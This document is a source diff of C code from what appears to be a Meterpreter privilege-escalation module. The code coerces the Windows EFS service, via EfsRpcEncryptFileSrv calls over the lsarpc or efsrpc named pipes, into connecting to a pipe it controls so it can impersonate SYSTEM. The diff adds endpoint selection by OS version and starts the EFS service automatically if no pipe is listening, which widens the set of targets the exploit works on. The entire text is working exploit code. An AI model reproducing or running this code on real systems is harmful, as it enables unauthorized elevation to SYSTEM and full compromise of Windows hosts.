@@ -1,16 +1,23 @@
 #include "precomp.h"
 #include "common_metapi.h"
 #include "namedpipe.h"
+#include "service.h"
 
 typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);
 
-RPC_STATUS EfsRpcEncryptFileSrv(handle_t binding_h, wchar_t* FileName);
+long StubEfsRpcEncryptFileSrv(PMIDL_STUB_DESC stub, handle_t binding_h, wchar_t* FileName);
+PMIDL_STUB_DESC GetLsaRpcStub();
+PMIDL_STUB_DESC GetEfsRpcStub();
 
-DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName);
-handle_t efs_bind(wchar_t* target);
+DWORD WINAPI trigger_efs_connection(RPC_WSTR uuid, RPC_WSTR endpoint, LPWSTR pPipeName);
+handle_t efs_bind(RPC_WSTR uuid, RPC_WSTR endpoint, wchar_t* target);
 
-const RPC_WSTR MS_EFSR_UUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
+const RPC_WSTR LSARPC_PIPE_MS_EFSR_UUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
 const RPC_WSTR LSARPC_NAMEDPIPE = (RPC_WSTR)L"\\pipe\\lsarpc";
+const RPC_WSTR EFSRPC_PIPE_MS_EFSR_UUID = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";
+const RPC_WSTR EFSRPC_NAMEDPIPE = (RPC_WSTR)L"\\pipe\\efsrpc";
+
+char* EFS_SERVICE_NAME = "EFS";
 
 DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 {
@@ -24,6 +31,8 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 	WCHAR cPipeName2[MAX_PATH] = { 0 };
 	DWORD dwPipeUid[2] = { 0, 0 };
 	PRIV_POST_IMPERSONATION PostImpersonation;
+	const RPC_WSTR *wEndpointUUID = NULL;
+	const RPC_WSTR *wNamedPipeEndpoint = NULL;
 
 	do {
 		hNtdll = GetModuleHandleA("ntdll");
@@ -40,10 +49,56 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: RtlGetVersion failed");
 		}
 
-		// filter out systems older than Windows Vista / Server 2008 (6.0) for this technique
+		
 		if (os.dwMajorVersion < 6) {
 			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: Windows versions older than 6.0 are unsupported");
+		}
+		// Windows Vista / Server 2008 only supports \pipe\lsarpc endpoint
+		else if ((os.dwMajorVersion == 6 && (os.dwMinorVersion == 0 || os.dwMinorVersion == 1))) {
+			if (!does_pipe_exist(L"\\\\.\\pipe\\lsarpc")) {
+				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\lsarpc is not listening.");
+			}
+			wEndpointUUID = &LSARPC_PIPE_MS_EFSR_UUID;
+			wNamedPipeEndpoint = &LSARPC_NAMEDPIPE;
+		}
+		else {
+			if (!does_pipe_exist(L"\\\\.\\pipe\\lsarpc") && !does_pipe_exist(L"\\\\.\\pipe\\efsrpc")) {
+				DWORD state;
+				if (service_query_status(EFS_SERVICE_NAME, &state) != ERROR_SUCCESS) {
+					BREAK_ON_ERROR("[ELEVATE] service_query_status: query service efs status failed.");
+				}
+
+				if (state != SERVICE_RUNNING && state != SERVICE_START_PENDING && state != SERVICE_CONTINUE_PENDING) {
+					dprintf("[ELEVATE] service_query_status: efs service is not running. Trying to start...");
+					if (service_start(EFS_SERVICE_NAME) != ERROR_SUCCESS) {
+						BREAK_ON_ERROR("[ELEVATE] service_start: starting efs service failed.");
+					}
+					if (service_query_status(EFS_SERVICE_NAME, &state) != ERROR_SUCCESS) {
+						BREAK_ON_ERROR("[ELEVATE] service_query_status: query service efs status failed.");
+					}
+				}
+
+				if (state == SERVICE_START_PENDING || state == SERVICE_CONTINUE_PENDING) {
+					if (service_wait_for_status(EFS_SERVICE_NAME, SERVICE_RUNNING, 30000) != ERROR_SUCCESS) {
+						BREAK_ON_ERROR("[ELEVATE] service_wait_for_status: service start timed out.");
+					}
+				}
+				else if (state != SERVICE_RUNNING) {
+					BREAK_ON_ERROR("[ELEVATE] service_query_status: efs service is not running.");
+				}
+			}
+
+			if (does_pipe_exist(L"\\\\.\\pipe\\efsrpc")) {
+				wEndpointUUID = &EFSRPC_PIPE_MS_EFSR_UUID;
+				wNamedPipeEndpoint = &EFSRPC_NAMEDPIPE;
+			}
+			else if (does_pipe_exist(L"\\\\.\\pipe\\lsarpc") && ((os.dwMajorVersion < 10) || ((os.dwMajorVersion == 10) && (os.dwBuildNumber <= 22000)))) {
+				wEndpointUUID = &LSARPC_PIPE_MS_EFSR_UUID;
+				wNamedPipeEndpoint = &LSARPC_NAMEDPIPE;
+			} else {
+				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: no usable pipes are listening.");
+			}
 		}
 
 		// generate a pseudo random name for the pipe
@@ -79,7 +134,8 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 			Sleep(500);
 		}
 
-		trigger_efs_connection(cPipeName2);
+		dprintf("[ELEVATE] calling trigger_efs_connection(), using endpoint: %ls", *wNamedPipeEndpoint);
+		DWORD dwTriggerResult = trigger_efs_connection(*wEndpointUUID, *wNamedPipeEndpoint, cPipeName2);
 
 		// signal our thread to terminate if it is still running
 		met_api->thread.sigterm(pThread);
@@ -95,7 +151,10 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 		}
 		dprintf("[ELEVATE] dwResult after exit code: %u", dwResult);
 
-	} while (0);
+		if (dwResult == ERROR_DBG_TERMINATE_THREAD)
+			dwResult = dwTriggerResult;
+
+	} while (FALSE);
 
 	if (pThread) {
 		met_api->thread.destroy(pThread);
@@ -107,7 +166,7 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 	return dwResult;
 }
 
-DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
+DWORD WINAPI trigger_efs_connection(RPC_WSTR uuid, RPC_WSTR endpoint, LPWSTR pPipeName)
 {
 	RPC_STATUS hr = 0;
 	LPWSTR pCaptureServer = NULL;
@@ -123,11 +182,12 @@ DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 		_snwprintf_s(pCaptureServer, MAX_PATH, _TRUNCATE, (LPWSTR)(L"\\\\localhost/pipe/%s/\\%s\\%s"), pPipeName, pPipeName, pPipeName);
 
 		RpcTryExcept
-			ht = efs_bind(L"localhost");
+			ht = efs_bind(uuid, endpoint, L"localhost");
 			if (ht == INVALID_HANDLE_VALUE) {
 				BREAK_WITH_ERROR("[ELEVATE] trigger_efs_connection: Bind error", ERROR_INVALID_HANDLE);
 			}
-			hr = EfsRpcEncryptFileSrv(ht, pCaptureServer);
+			PMIDL_STUB_DESC stub = wcscmp(endpoint, LSARPC_NAMEDPIPE) == 0 ? GetLsaRpcStub() : GetEfsRpcStub();
+			hr = (RPC_STATUS)StubEfsRpcEncryptFileSrv(stub, ht, pCaptureServer);
 		RpcExcept(EXCEPTION_EXECUTE_HANDLER)
 			dprintf("[ELEVATE] trigger_efs_connection: RPC Error: 0x%08x", RpcExceptionCode());
 			dwResult = RPC_S_CALL_FAILED;
@@ -137,7 +197,14 @@ DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 		if (hr == ERROR_BAD_NETPATH) {
 			dprintf("[ELEVATE] trigger_efs_connection: Success");
 		} else {
-			dprintf("[ELEVATE] trigger_efs_connection: Did not receive expected output. Attack might have failed.");
+			unsigned char RpcError[DCE_C_ERROR_STRING_LEN];
+			if (DceErrorInqTextA(hr, RpcError) == RPC_S_OK) {
+				dprintf("[ELEVATE] trigger_efs_connection - RPC error in EfsRpcEncryptFileSrv: 0x%08x - %s", hr, RpcError);
+			}
+			else {
+				dprintf("[ELEVATE] trigger_efs_connection - RPC error in EfsRpcEncryptFileSrv: 0x%08x", hr);
+			}
+			dwResult = RPC_S_CALL_FAILED;
 		}
 
 	} while (0);
@@ -164,7 +231,7 @@ DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 	}\
 }
 
-handle_t efs_bind(wchar_t* target)
+handle_t efs_bind(RPC_WSTR uuid, RPC_WSTR endpoint, wchar_t* target)
 {
 	RPC_STATUS RpcStatus;
 	unsigned char RpcError[DCE_C_ERROR_STRING_LEN];
@@ -174,10 +241,10 @@ handle_t efs_bind(wchar_t* target)
 
 	_snwprintf_s(buffer, MAX_PATH, _TRUNCATE, L"\\\\%s", target);
 	RpcStatus = RpcStringBindingComposeW(
-		MS_EFSR_UUID,
+		uuid,
 		(RPC_WSTR)L"ncacn_np",
 		(RPC_WSTR)buffer,
-		LSARPC_NAMEDPIPE,
+		endpoint,
 		NULL,
 		&StringBinding);
 	CHECK_RPC_STATUS_AND_RETURN("RpcStringBindingComposeW", RpcStatus);
